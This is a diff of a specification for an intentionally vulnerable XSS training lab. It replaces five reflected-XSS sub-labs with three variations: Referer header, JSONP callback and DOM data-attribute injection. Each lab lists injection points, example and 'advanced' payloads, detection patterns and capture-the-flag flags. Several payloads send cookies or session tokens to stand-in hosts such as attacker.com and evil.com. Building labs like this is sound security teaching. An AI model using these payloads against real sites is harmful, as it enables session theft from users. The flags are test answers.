@@ -585,134 +585,81 @@ VULNERABILITY TYPE: Reflected XSS / Stored XSS
 SEVERITY: High
 OBJECTIVE: Inject and execute JavaScript code in the browser
 
-Lab 8.1 - Reflected XSS Attack Vectors (5 Sub-Labs)
-====================================================
+Lab 8.1 - Reflected XSS (3 Variations)
+====================================
 
-Lab 8.1.A - TechCorp Employee Portal (Script Injection) [AVAILABLE]
-====================================================================
+Lab 8.1A - ContactForm (Variation A - HTTP Header Reflection XSS)
+================================================================
 Case Study Question:
-"You are testing the TechCorp Employee Management System. After logging in with 
-demo credentials (emp123/password), you discover an employee search feature that 
-reflects user input without proper sanitization. The search query parameter is 
-directly inserted into the HTML response. Can you exploit this reflected XSS 
-vulnerability by injecting a <script> tag in the search field to execute 
-JavaScript and capture the flag?"
+"The ContactForm web application allows users to submit contact requests and 
+include their website URL. However, the application reflects the 'Referer' HTTP 
+header (which contains the referring page URL) in the email notification without 
+proper sanitization. An attacker can craft a malicious Referer header containing 
+JavaScript code. When the email is viewed in an HTML-capable email client, the 
+script executes. Can you craft a Referer header containing XSS payload that 
+executes when the confirmation page is loaded?"
 
-Vulnerability Location: /lab8/1/a (TechCorp Employee Dashboard)
-Login Credentials: emp123 / password (any username/password combination works)
-Vulnerable Feature: Search Employee Database
-Injection Parameter: 'search_query' (POST request)
-Injection Point: Search input field on dashboard
-Injection Context: HTML content reflection (search results display)
-Example Payload: <script>alert('XSS')</script>
-Advanced Payload: <script>alert(document.cookie)</script>
-Detection Patterns: <script, javascript:, %3cscript (case-insensitive)
-Success Indicator: Green alert box with flag displayed
-UI Design: Professional corporate blue theme with stats dashboard
+Vulnerability Location: /lab8/1/contact-submit
+Parameter: HTTP Header 'Referer' (reflected in response)
+Vulnerable Field: The 'Referer' header is reflected in HTML email/confirmation page
+Injection Point: Referer HTTP header containing JavaScript
+Injection Context: HTML attribute context (quoted attribute)
+Example Payload: https://attacker.com/" onload="alert('Header XSS')
+Advanced Payload: https://normal.com/page.html"><script src='http://attacker.com/steal.js'></script>
+Detection: Analyzing HTTP headers and response reflection
+Bypass Techniques: Using event handlers in attribute context, encoding
 Available Flags (Random Selection):
   - FLAG{script_injection_pi2}
   - FLAG{context_escape_rho2}
   - FLAG{dom_manipulation_sigma2}
 
-Lab 8.1.B - ShopHub Seller Portal (Image Tag Injection) [AVAILABLE]
-====================================================================
+Lab 8.1B - APIGateway (Variation B - JSON Parameter XSS)
+=========================================================
 Case Study Question:
-"You are auditing the ShopHub e-commerce platform's seller portal. After 
-logging in, sellers can upload products with images. The product upload form 
-has an 'Image Alt Text' field that is vulnerable to XSS. The application does 
-not sanitize the alt text before rendering it in the product gallery. Can you 
-inject malicious <img> tags with onerror event handlers to execute JavaScript?"
+"The APIGateway integration service accepts JSON requests with a 'callback' 
+parameter used for JSONP (JSON with Padding) responses. The application 
+reflects the callback parameter name directly in the JavaScript response 
+without validation. An attacker can inject malicious function names or 
+JavaScript code into the callback parameter. When the browser executes the 
+JSONP response, the injected code runs. Can you craft a JSONP callback 
+payload that executes arbitrary JavaScript and exfiltrates user data?"
 
-Vulnerability Location: /lab8/1/b (ShopHub Seller Dashboard)
-Login Credentials: Any username/password combination
-Vulnerable Feature: Product Upload / Image Gallery
-Injection Parameter: 'image_alt' (POST request)
-Injection Point: Image Alt Text field in product upload form
-Injection Context: HTML img tag alt attribute
-Example Payload: <img src=x onerror=alert('XSS')>
-Advanced Payload: <img src=invalid onerror="fetch('http://attacker.com?cookie='+document.cookie)">
-Detection Patterns: <img, onerror=, %3cimg (case-insensitive)
-Success Indicator: Flag displayed when malicious image tag is detected
-UI Design: E-commerce green theme with product gallery grid
+Vulnerability Location: /lab8/1b/api/data
+Parameter: 'callback' (JSON/JSONP request)
+Vulnerable Field: Callback function name reflected in JSONP response
+Injection Point: JSONP callback parameter in API request
+Injection Context: JavaScript code context (function name)
+Example Payload: alert('JSONP XSS');function _
+Advanced Payload: fetch('http://attacker.com/steal?data='+btoa(sessionStorage.getItem('token')));var x=1;function _
+Detection: Analyzing JSONP responses and function naming
+Bypass Techniques: Function name injection, statement chaining with semicolons
 Available Flags (Random Selection):
   - FLAG{script_injection_pi2}
   - FLAG{context_escape_rho2}
   - FLAG{dom_manipulation_sigma2}
 
-Lab 8.1.C - DesignHub Designer Portal (SVG Injection) [UNAVAILABLE]
-====================================================================
+Lab 8.1C - VideoStream (Variation C - DOM Attribute Data Reflection XSS)
+=========================================================================
 Case Study Question:
-"The DesignHub creative platform allows designers to create projects with 
-descriptions that support rich formatting. The 'Project Description' field 
-is vulnerable to SVG-based XSS attacks. SVG elements can contain onload 
-event handlers that execute JavaScript when the SVG is rendered. Can you 
-craft an SVG payload with an onload handler to exploit this vulnerability?"
+"The VideoStream platform allows users to customize video player settings via 
+URL parameters. The 'title' parameter is reflected into a data attribute of an 
+HTML element (data-tooltip='...'). The JavaScript code then reads this 
+attribute and inserts it into the DOM using innerHTML without sanitization. 
+An attacker can break out of the attribute context and inject scripts. When 
+the page is loaded, malicious JavaScript in the data attribute is inserted 
+into the document and executed. Can you craft a payload that exploits this 
+DOM-based reflection to execute code and steal login session information?"
 
-STATUS: CURRENTLY UNAVAILABLE - Module disabled for maintenance
-Vulnerability Location: /lab8/1/c (DesignHub Design Studio)
-Login Credentials: Any username/password combination
-Vulnerable Feature: Project Creation Form
-Injection Parameter: 'project_desc' (POST request)
-Injection Point: Project Description field
-Injection Context: HTML content allowing SVG markup
-Example Payload: <svg onload=alert('XSS')>
-Advanced Payload: <svg/onload=alert(document.domain)>
-Detection Patterns: <svg, onload=, %3csvg (case-insensitive)
-UI Design: Creative purple theme with portfolio grid
-Available Flags (Random Selection):
-  - FLAG{script_injection_pi2}
-  - FLAG{context_escape_rho2}
-  - FLAG{dom_manipulation_sigma2}
-
-Lab 8.1.D - SocialBuzz Social Media (Event Handler Injection) [UNAVAILABLE]
-===========================================================================
-Case Study Question:
-"SocialBuzz is a social media platform where users can create posts. The post 
-composition feature does not properly sanitize HTML event handlers. Attackers 
-can inject HTML elements with event handlers like onmouseover, onmouseenter, 
-onfocus, etc., that execute JavaScript when users interact with the post. Can 
-you create a post with malicious event handlers that trigger XSS attacks when 
-other users hover over or interact with your content?"
-
-STATUS: CURRENTLY UNAVAILABLE - Module disabled for maintenance
-Vulnerability Location: /lab8/1/d (SocialBuzz Social Feed)
-Login Credentials: Any username/password combination
-Vulnerable Feature: Post Composer / Social Feed
-Injection Parameter: 'post_content' (POST request)
-Injection Point: Post content textarea
-Injection Context: HTML content with event handler attributes
-Example Payload: <span onmouseover=alert('XSS')>Hover me</span>
-Advanced Payload: <div onfocus="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))" tabindex="1">Click</div>
-Detection Patterns: onmouseover=, onmouseenter=, onkeydown=, onfocus=, ondblclick= (case-insensitive)
-Success Indicator: Flag displayed when event handler is detected
-UI Design: Social media red theme with dynamic feed
-Available Flags (Random Selection):
-  - FLAG{script_injection_pi2}
-  - FLAG{context_escape_rho2}
-  - FLAG{dom_manipulation_sigma2}
-
-Lab 8.1.E - DocVault Document Management (IFrame Injection) [UNAVAILABLE]
-==========================================================================
-Case Study Question:
-"DocVault is a secure document management system that allows users to embed 
-documents using iframe tags. However, the 'Document Source' field does not 
-validate or sanitize the iframe src attribute. Attackers can use the 
-javascript: protocol in iframe sources to execute arbitrary JavaScript code. 
-Can you exploit this vulnerability by crafting an iframe with a malicious 
-javascript: URL?"
-
-STATUS: CURRENTLY UNAVAILABLE - Module disabled for maintenance
-Vulnerability Location: /lab8/1/e (DocVault Document Dashboard)
-Login Credentials: Any username/password combination
-Vulnerable Feature: Document Embedding Form
-Injection Parameter: 'doc_source' (POST request)
-Injection Point: Document Source/Embed Code field
-Injection Context: HTML iframe src attribute
-Example Payload: <iframe src="javascript:alert('XSS')"></iframe>
-Advanced Payload: <iframe src="javascript:void(fetch('http://evil.com?data='+btoa(localStorage.getItem('token'))))"></iframe>
-Detection Patterns: <iframe, javascript:, %3ciframe (case-insensitive)
-Success Indicator: Flag displayed when iframe injection is detected
-UI Design: Enterprise cyan theme with document list
+Vulnerability Location: /lab8/1c/player
+Parameter: 'title' (GET request)
+Vulnerable Field: URL parameter reflected in HTML data attribute
+Injection Point: data-tooltip attribute in video player element
+Injection Context: HTML attribute context with subsequent DOM innerHTML insertion
+Reflection Method: Parameter → HTML attribute → DOM innerHTML insertion
+Example Payload: Video'></div><img src=x onerror='alert("DOM XSS")'><div class='x
+Advanced Payload: "><iframe src="javascript:alert(document.cookie)"></iframe><span class="x
+Detection: Analyzing data attributes and DOM manipulation code in JavaScript
+Bypass Techniques: Attribute breaking with quotes, iframe injection, nested event handlers
 Available Flags (Random Selection):
   - FLAG{script_injection_pi2}
   - FLAG{context_escape_rho2}
